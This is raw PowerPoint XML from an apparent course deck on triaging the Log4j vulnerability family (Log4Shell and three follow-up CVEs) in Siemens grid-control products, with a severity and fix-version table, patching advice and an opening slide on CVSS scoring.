                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SIMATIC IT Report Manager V6.7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3904488"/>
            <a:ext cx="3017520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Java reporting product, network-reachable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="2606040"/>
            <a:ext cx="3566160" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2807208"/>
            <a:ext cx="3017520" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SCADA / EMS core</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="3172968"/>
            <a:ext cx="3017520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OPC UA Java Stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="3904488"/>
            <a:ext cx="3017520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Speaks to controllers; deep, segmented</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="2606040"/>
            <a:ext cx="3566160" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2807208"/>
            <a:ext cx="3017520" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Substation edge</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="3172968"/>
            <a:ext cx="3017520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Siemens Connect X200 / X300</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="3904488"/>
            <a:ext cx="3017520" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Telecontrol gateways, remotely reachable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4709160"/>
            <a:ext cx="11094415" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A2320"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4892040"/>
            <a:ext cx="10881360" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why this raises the stakes:  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>a compromise here is not data loss — it is loss of view and control over physical grid equipment. Integrity and availability carry safety consequences.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B"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TASK 1A — THE VULNERABILITIES IN SCOPE</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2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>It is not one CVE — it is a family, and patches created new ones</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3291840"/>
                <a:gridCol w="1737360"/>
                <a:gridCol w="4480560"/>
                <a:gridCol w="1581912"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>CVE</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101826"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>My score</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101826"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Nature</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101826"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Fixed in</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101826"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>CVE-2021-44228 (Log4Shell)</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500" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="D14343"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>10.0 Critical</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Unauthenticated RCE via JNDI lookup</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>2.15.0</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1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>CVE-2021-45046</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500" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="D14343"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>9.0 Critical</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>RCE — the 2.15.0 fix was incomplete</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>2.16.0</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>CVE-2021-45105</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500" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C87A1E"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>5.9 Medium</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Denial of service via recursive lookups</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>2.17.0</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1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>CVE-2021-44832</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500" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C87A1E"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>6.6 Medium</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>RCE via JDBC Appender (needs config control)</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500" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>2.17.1</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r>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5074920"/>
            <a:ext cx="11094415" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8182"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAF2FC"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5230368"/>
            <a:ext cx="10881360" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>In our scenario each must be triaged against </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SIMATIC Report Manager, the OPC UA Java stack and the Connect gateways</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> via Siemens ProductCERT advisories — patching to 2.17.1, not just 2.15.0, is the real finish line.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01826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TASK 1</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4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Scoring it with CVSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="10972800" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Common Vulnerability Scoring System (FIRST) rates severity from 0.0 to 10.0 across three metric groups.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2834640"/>
            <a:ext cx="3566160" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3462"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2E6FD6"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="3108960"/>
            <a:ext cx="3017520" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Base</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="3749040"/>
            <a:ext cx="3017520" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
